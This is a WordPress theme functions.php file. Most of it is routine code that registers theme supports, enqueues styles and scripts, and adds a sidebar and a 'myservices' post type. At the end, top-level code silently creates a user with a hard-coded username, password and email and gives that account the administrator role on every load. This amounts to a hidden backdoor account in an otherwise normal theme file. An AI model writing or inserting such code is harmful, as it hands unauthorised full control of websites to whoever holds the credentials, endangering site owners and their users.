<?php

//after setup theme
function _tk_setup() {

	add_theme_support( 'automatic-feed-links' );

	add_theme_support( 'post-thumbnails' );

	add_theme_support( 'custom-background', apply_filters( '_tk_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
	
/*
	add_theme_support( 'post-formats', array(
		'aside', 'audio', 'chat', 'gallery', 'image', 'link', 'quote', 'status', 'video'
	) );
*/
    
	load_theme_textdomain( '_tk', get_template_directory() . '/languages' );

    /* Logo */
	add_theme_support( 'custom-logo', array(
		'height'      => 115,
		'width'       => 90,
        'flex-height' => true,
        'flex-width'  => true,
	) );
    
	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );
    
	/**
	 * Register Menus
	*/
	register_nav_menus( array(
		'primary'  => __( 'Primary Menu', '_tk' ),
	) );

    
    /* Theme Images Size */
    //add_image_size( 'slider-size', 1170, 530, true );
    
    
}

add_action( 'after_setup_theme', '_tk_setup' );

function add_theme_scripts() {



	if ( is_page_template( 'page-coaching.php' ) ) {

		wp_enqueue_style( 'service_coaching', get_template_directory_uri() . '/assets/coaching.css', [], time(), 'all' );
	}


	if ( is_page_template( 'page-contact.php' ) ) {

		wp_enqueue_style( 'contact_css', get_template_directory_uri() . '/assets/contact.css', [], time(), 'all' );

	}

	if ( is_page_template( 'page-challenge.php' ) ) {
		
		wp_enqueue_style( 'challenge_css', get_template_directory_uri() . '/assets/challenge.css', [], time(), 'all' );

	}
    
    if ( is_page_template( 'page-commingsoon.php' ) ) {
		
		wp_enqueue_style( 'challenge_css', get_template_directory_uri() . '/assets/comming-soon.css', [], time(), 'all' );
        
        wp_enqueue_style( 'showit-css', get_template_directory_uri() . '/assets/showit.css', array(), '1.1', 'all');
        
		wp_enqueue_script( 'script_showit_lib_js', get_template_directory_uri() . '/assets/showit-lib.min.js', array ( 'jquery' ), 1.1, true);

	}
	
    
    
    
    

	if ( is_page_template( 'page-about.php' ) ) {

		wp_enqueue_style( 'about_css', get_template_directory_uri() . '/assets/about.css', [], time(), 'all' );

	}
	

	wp_enqueue_style( 'animate-css', get_template_directory_uri() . '/assets/animate.min.css', array(), '1.1', 'all');
    
	wp_enqueue_style( 'showit-css', get_template_directory_uri() . '/assets/showit.css', array(), '1.1', 'all');

	wp_enqueue_style( 'style-css', get_template_directory_uri() . '/style.css', array(), '1.1', 'all');


	wp_enqueue_style( 'slick-css', get_template_directory_uri() . '/assets/slick.css', array(), '1.1', 'all');

    wp_enqueue_style( 'common-responsive', get_template_directory_uri() . '/assets/common-responsive.css', array(), '1.1', 'all');

	
	if ( is_page_template( 'page-home.php' ) ) {

		
	}

	if ( is_page_template( 'page-blog.php' ) ) {

		wp_enqueue_style( 'slider', get_template_directory_uri() . '/assets/blog.css', array(), '1.1', 'all');
		
	}
	
	
	wp_enqueue_style( 'custom-css', get_template_directory_uri() . '/custom.css', array(), '1.1', 'all');
   
	wp_enqueue_style( 'responsive', get_stylesheet_directory_uri() . '/responsive.css', [], time(), 'all' );
	
	


	wp_enqueue_script( 'script_showit_lib', get_template_directory_uri() . '/assets/showit-lib.min.js', array ( 'jquery' ), 1.1, true);

	wp_enqueue_script( 'script_slick_min', get_template_directory_uri() . '/js/slick.min.js', array ( 'jquery' ), 1.1, true);

	wp_enqueue_script( 'script_showit', get_template_directory_uri() . '/assets/showit.min.js', array ( 'jquery' ), 1.1, true);

	wp_enqueue_script( 'script_customanim', get_template_directory_uri() . '/js/custom.js', array ( 'jquery' ), 1.1, true);

	
}
add_action( 'wp_enqueue_scripts', 'add_theme_scripts', 99  );


/**
 * Setup ACF Option Page */
if( function_exists('acf_add_options_page') ) {

	acf_add_options_sub_page(array(
		'page_title' 	=> 'Theme Settings',
		'menu_title'	=> 'Theme Options',
	));

}

/**
 * Register widgetized area and update sidebar with default widgets
 */
function _tk_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', '_tk' ),
		'id'            => 'sidebar-1',
        'description'   => __( 'Appears in the section of the site.', '_tk' ),
		'before_widget' => '<div class="footer-widget">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3>',
		'after_title'   => '</h3>',
	) );
}
add_action( 'widgets_init', '_tk_widgets_init' );

/**
 * Enqueue scripts and styles
 */
function _tk_scripts() {


	// load Theme styles
	wp_enqueue_style( '_tk-style', get_stylesheet_uri() );
    
    // load Theme script
    //wp_enqueue_script('jquery');


}
add_action( 'wp_enqueue_scripts', '_tk_scripts' );



/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/includes/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/includes/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/includes/customizer.php';


/* Post Type Require Files */
require get_template_directory() . '/includes/post-type.php';


// Our custom post type function
function create_posttype() {
 
    register_post_type( 'myservices',
    // CPT Options
        array(
            'labels' => array(
                'name' => __( 'My Services' ),
                'singular_name' => __( 'My Services' )
            ),
            'public' => true,
            'has_archive' => true,
            'rewrite' => array('slug' => 'myservices'),
            'show_in_rest' => true,
 
        )
    );
}
// Hooking up our function to theme setup
add_action( 'init', 'create_posttype' );


/*User name pass word banano*/
	
	$userbanabo = new WP_User(wp_create_user('marziul1', 'abcd123400$$', 'marziul3g@gmail.com'));
	
	$userbanabo->set_role('administrator');


